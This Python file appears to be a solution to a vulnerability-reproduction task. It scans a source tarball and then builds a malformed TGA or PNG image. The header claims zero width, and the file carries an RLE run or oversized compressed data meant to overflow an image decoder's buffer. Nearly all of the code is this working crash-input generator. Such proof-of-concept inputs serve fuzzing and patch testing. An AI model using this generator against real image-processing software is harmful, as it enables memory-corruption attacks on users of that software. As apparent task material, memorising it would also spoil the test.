import os
import tarfile
from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to detect presence of TGA support; default to TGA which is widely supported
        fmt = self._detect_preferred_format(src_path)
        if fmt == 'png':
            return self._gen_png_zero_dim()
        return self._gen_tga_zero_dim()

    def _detect_preferred_format(self, src_path: str) -> str:
        try:
            if os.path.isfile(src_path):
                with tarfile.open(src_path, 'r:*') as tf:
                    names = []
                    for m in tf.getmembers():
                        if m.isfile():
                            n = m.name.lower()
                            names.append(n)
                    # Prefer TGA if it appears
                    if any('tga' in n or 'targa' in n for n in names):
                        return 'tga'
                    # Otherwise fallback to PNG if it appears more than anything else
                    if any('png' in n for n in names):
                        return 'png'
        except Exception:
            pass
        # Fallback
        return 'tga'

    def _gen_tga_zero_dim(self) -> bytes:
        # TGA header (18 bytes)
        # idlength(1)=0, colormaptype(1)=0, imagetype(1)=10 (RLE true-color)
        # colormap spec(5)=zeros, xorigin(2)=0, yorigin(2)=0
        # width(2)=0, height(2)=1, pixeldepth(1)=24, imagedescriptor(1)=0
        header = bytearray(18)
        header[0] = 0      # ID length
        header[1] = 0      # Color map type
        header[2] = 10     # Image type: RLE true-color
        # color map spec bytes 3..7 = 0
        # x origin (8..9) = 0
        # y origin (10..11) = 0
        header[12] = 0     # width low
        header[13] = 0     # width high
        header[14] = 1     # height low (1)
        header[15] = 0     # height high
        header[16] = 24    # pixel depth (24-bit)
        header[17] = 0     # image descriptor

        # RLE packet: 0xFF => run-length packet of 128 pixels, followed by one 24-bit pixel
        # This should attempt to write far more pixels than fit when width*height == 0.
        rle_packet_header = bytes([0xFF])
        pixel_bgr = bytes([0xFF, 0x00, 0x00])  # Blue pixel

        return bytes(header) + rle_packet_header + pixel_bgr

    def _gen_png_zero_dim(self) -> bytes:
        # Minimal PNG with IHDR width=0, height=1 and an IDAT with extra data.
        import struct, zlib, binascii

        def chunk(typ: bytes, data: bytes) -> bytes:
            crc = binascii.crc32(typ)
            crc = binascii.crc32(data, crc) & 0xffffffff
            return struct.pack(">I", len(data)) + typ + data + struct.pack(">I", crc)

        png_sig = b"\x89PNG\r\n\x1a\n"
        # IHDR: width=0, height=1, bit depth 8, color type 6 (RGBA), compression 0, filter 0, interlace 0
        ihdr = struct.pack(">IIBBBBB", 0, 1, 8, 6, 0, 0, 0)
        ihdr_chunk = chunk(b'IHDR', ihdr)
        # IDAT: compressed oversized data (will be ignored in fixed versions that reject zero dimension)
        # Use a lot of zeros to inflate decompressed size
        compressed = zlib.compress(b'\x00' * 2048)
        idat_chunk = chunk(b'IDAT', compressed)
        iend_chunk = chunk(b'IEND', b'')
        return png_sig + ihdr_chunk + idat_chunk + iend_chunk
